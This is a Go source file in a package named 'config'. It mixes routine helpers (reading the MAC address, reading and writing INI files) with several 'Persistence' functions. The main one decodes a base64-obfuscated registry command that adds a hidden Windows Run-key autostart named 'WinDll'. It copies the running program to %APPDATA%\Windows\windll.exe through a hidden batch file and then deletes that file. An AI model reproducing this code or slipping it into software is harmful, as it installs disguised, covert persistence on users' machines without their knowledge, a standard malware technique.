package config

import (
    "bytes"
    "flag"
    "fmt"
    "github.com/larspensjo/config"
    "log"
    "net"
    "os"
    "os/exec"
    "os/user"
    "runtime"
    "strconv"
    "strings"

    "encoding/base64"
    "syscall"
)


var (
    conFile = flag.String("configfile", "\\src\\config.ini", "config file")
    conFile_2 = flag.String("configfile_2", "\\src\\config_2.ini", "config file")
)





// getMacAddr gets the MAC hardware
// address of the host machine
func GetMacAddr() (addr string) {
    r := strings.NewReplacer(":","");

    interfaces, err := net.Interfaces()
    if err == nil {
        for _, i := range interfaces {
            log.Printf("读取窗口信息%v  %s  %s", i.Flags, i.Name,r.Replace(i.HardwareAddr.String()))


            if i.Flags&net.FlagUp != 0 && bytes.Compare(i.HardwareAddr, nil) != 0 {
                // Don't use random as we have a real address
                addr = i.HardwareAddr.String()

                addr = r.Replace(addr)
                //break
            }
        }
    }
    return
}
func Open_config() (cfg *config.Config) {
    //获取当前路径
    file, _ := os.Getwd()
    log.Printf("读取窗口信息 %s", file)
    log.Printf("读取窗口信息 %v", runtime.NumCPU())
    cfg, err := config.ReadDefault(file + *conFile)

    if err != nil {
        log.Printf("无法找到", *conFile, err)
    }

return cfg

}





type Student struct {
    name string
    age int
}


const (
    CFG_FIE_NAME = "students.cfg"

    SECTION1 = "Student 1"
    SECTION2 = "Section 2"

    OPTION_NAME = "Name"
    OPTION_AGE = "Age"
)

func foo(config_file_name *string) {

    file, _ := os.Getwd()


    c := config.NewDefault()

    tom := Student{"Tom", 5}
    jerry := Student{"Jerry", 6}

    c.AddSection(SECTION1)
    c.AddOption(SECTION1, OPTION_NAME, tom.name)
    c.AddOption(SECTION1, OPTION_AGE, strconv.Itoa(tom.age))

    c.AddSection(SECTION2)
    c.AddOption(SECTION2, OPTION_NAME, jerry.name)
    c.AddOption(SECTION2, OPTION_AGE, strconv.Itoa(jerry.age))

    c.WriteFile(file + *config_file_name, 0644, "All the students")

    fmt.Println("Done   ")
}




func Persistence() {
    //REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V WinDll /t REG_SZ /F /D %APPDATA%\Windows\windll.exe
    var RegAdd string = "UkVHIEFERCBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBXaW5EbGwgL3QgUkVHX1NaIC9GIC9EICVBUFBEQVRBJVxXaW5kb3dzXHdpbmRsbC5leGU="
    DecodedRegAdd, _ := base64.StdEncoding.DecodeString(RegAdd)

    PERSIST, _ := os.Create("PERSIST.bat")

    PERSIST.WriteString("mkdir %APPDATA%\\Windows"+"\n")
    PERSIST.WriteString("copy " + os.Args[0] + " %APPDATA%\\Windows\\windll.exe\n")
    PERSIST.WriteString(string(DecodedRegAdd))
    PERSIST.Close()



    Exec := exec.Command("cmd", "/C", "PERSIST.bat");
    Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
    Exec.Run();
    Clean := exec.Command("cmd", "/C", "del PERSIST.bat");
    Clean.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
    Clean.Run();

}



func Persistence_create() {
    var re string = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V WinDll /t REG_SZ /F /D %APPDATA%\\Windows\\windll.exe";
    EecodedRegAdd := base64.StdEncoding.EncodeToString([]byte(re))

    //REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V WinDll /t REG_SZ /F /D %APPDATA%\Windows\windll.exe
    var RegAdd string = "UkVHIEFERCBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBXaW5EbGwgL3QgUkVHX1NaIC9GIC9EICVBUFBEQVRBJVxXaW5kb3dzXHdpbmRsbC5leGU="
    DecodedRegAdd, _ := base64.StdEncoding.DecodeString(RegAdd)

    PERSIST, _ := os.Create("PERSIST.bat")

    PERSIST.WriteString("mkdir %APPDATA%\\Windows"+"\n")
    PERSIST.WriteString("copy " + os.Args[0] + " %APPDATA%\\Windows\\windll.exe\n")
    PERSIST.WriteString(string(DecodedRegAdd)+"\n")
    PERSIST.WriteString(re)
    PERSIST.WriteString("\n")
    PERSIST.WriteString(RegAdd+"\n")
    PERSIST.WriteString(EecodedRegAdd+"\n")


    PERSIST.Close()


}



func Persistence_node() {
    //REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V WinDll /t REG_SZ /F /D %APPDATA%\Windows\windll.exe
    var re string = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V WinDll /t REG_SZ /F /D %APPDATA%\\Windows\\windll.exe";

    var RegAdd string = "UkVHIEFERCBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBXaW5EbGwgL3QgUkVHX1NaIC9GIC9EICVBUFBEQVRBJVxXaW5kb3dzXHdpbmRsbC5leGU="
    DecodedRegAdd, _ := base64.StdEncoding.DecodeString(RegAdd)

    PERSIST, _ := os.Create("PERSIST.bat")

    PERSIST.WriteString("mkdir %APPDATA%\\Windows"+"\n")
    PERSIST.WriteString("copy " + os.Args[0] + " %APPDATA%\\Windows\\windll.exe\n")
    PERSIST.WriteString(string(DecodedRegAdd))
    PERSIST.WriteString(re)


    PERSIST.Close()
}


func Persistence_Command() {



   // Exec := exec.Command("cmd", "/C", "PERSIST.bat");
//    Exec := exec.Command("cmd", "dir");
/*    Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
    Exec.Run();
    Clean := exec.Command("cmd", "/C", "del PERSIST.bat");
    Clean.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
    Clean.Run();*/
/*    if err := Exec.Run(); err != nil{
        fmt.Println(err)
    }*/



/*    out, err := Exec.CombinedOutput()
    if err != nil {
        fmt.Println(err)
    }
    fmt.Println(string(out))
    fmt.Println(f) //  /bin/ls
*/

/*    out, err := Exec.Output()
    if err != nil {
        fmt.Println(err)
    }
    fmt.Println(string(out))
*/
    myuser, _ := user.Current()

    uid, _ := strconv.Atoi(myuser.Uid)
    gid, _ := strconv.Atoi(myuser.Gid)

    fmt.Printf("Run Command got an Error: %s\n", uid,gid)


    cmd := exec.Command("C:\\\"Program Files (x86)\"\\Google\\Chrome\\Application\\Chrome.exe",)
    cmd.SysProcAttr = &syscall.SysProcAttr{}
//    cmd.SysProcAttr.Credential = &syscall.Credential{Uid: uid, Gid: gid}

   // cmd.SysProcAttr.Credential = &syscall.Credential{Uid: uint32(uid), Gid: uint32(gid)}
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    out, err := cmd.Output()
    if err != nil {
        fmt.Printf("Run Command got an Error: %s\n", err)
        return
    }
    fmt.Println(out)




/*
    user, err := user.Lookup("nobody")
    if err == nil {
        log.Printf("uid=%s,gid=%s", user.Uid, user.Gid)

        uid, _ := strconv.Atoi(user.Uid)
        gid, _ := strconv.Atoi(user.Gid)

        cmd.SysProcAttr = &syscall.SysProcAttr{}
        cmd.SysProcAttr.Credential = &syscall.Credential{Uid: uint32(uid), Gid: uint32(gid)}
    }
*/




/*
    cmd := exec.Command("cmd")
    in := bytes.NewBuffer(nil)
    cmd.Stdin = in//绑定输入
   // cmd.Stderr = out
    var out bytes.Buffer
    cmd.Stdout = &out //绑定输出
    go func() {
   //     in.WriteString("node E:/design/test.js\n")//写入你的命令，可以有多行，"\n"表示回车
        in.WriteString("dir\n")//写入你的命令，可以有多行，"\n"表示回车
        in.WriteString("echo aaa\n")//写入你的命令，可以有多行，"\n"表示回车
        in.WriteString("C:\\\"Program Files (x86)\"\\Google\\Chrome\\Application\\Chrome.exe baidu.com\n")//写入你的命令，可以有多行，"\n"表示回车


    }()
    err := cmd.Start()
    if err != nil {
        log.Fatal(err)
    }

    err = cmd.Wait()
    if err != nil {
        log.Printf("Command finished with error: %v", err)
    }
    log.Printf("中文啊啊Command finished with error: %v", err)



    log.Println(cmd.Args)


    fmt.Println(out.String())*/
}



func main() {


/*    cfg := main__open_config()
    main_seral_up_network(cfg)
    main_mqtt()*/
/*    addr := getMacAddr()
    log.Printf("读取窗口信息 %s", addr)
    r := strings.NewReplacer(":", "", ">", "&gt;")
    fmt.Println(r.Replace(addr))*/


}

